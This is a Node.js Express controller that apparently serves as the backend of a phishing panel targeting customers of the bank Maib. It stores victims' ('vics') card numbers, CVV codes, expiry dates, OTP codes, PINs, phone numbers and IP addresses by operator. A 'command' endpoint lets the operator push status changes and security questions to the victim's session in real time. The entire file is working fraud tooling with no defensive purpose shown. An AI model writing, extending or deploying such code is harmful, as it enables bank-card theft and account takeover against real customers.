const Maib = require("../models/maibModel");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    Maib
        .find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status, secQuestion } = req.body;
    try {
        if (status == 10) {
            await Maib
                .findOneAndUpdate({ uniqueid }, { status, secQuestion })
                .exec();
        } else {
            await Maib.findOneAndUpdate({ uniqueid }, { status }).exec();
        }
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    Maib.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitCard = async (req, res) => {
    const { ccnum, uniqueid, owner, ip } = req.body;
    try {
        await Maib.create({ uniqueid, ccnum, status: 1, owner, ip, timestamp: moment().format() });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitCardAgain = async (req, res) => {
    const { ccnum, uniqueid } = req.body;
    try {
        await Maib.findOneAndUpdate({ uniqueid }, { ccnum, status: 7, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await Maib.findOneAndUpdate({ uniqueid }, { otp, status: 3, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTelephone = async (req, res) => {
    const { telephone, uniqueid } = req.body;
    try {
        await Maib.findOneAndUpdate({ uniqueid }, { telephone, status: 5, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitPin = async (req, res) => {
    const { pin, uniqueid } = req.body;
    try {
        await Maib.findOneAndUpdate({ uniqueid }, { pin, status: 9, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitBilling = async (req, res) => {
    const { ccexp, cvv, uniqueid } = req.body;
    try {
        await Maib.findOneAndUpdate({ uniqueid }, { ccexp, cvv, status: 11, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await Maib.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitTelephone,
    submitCardAgain,
    submitPin,
    submitBilling,
    submitOtp,
    submitCard,
    deleteEntry,
};
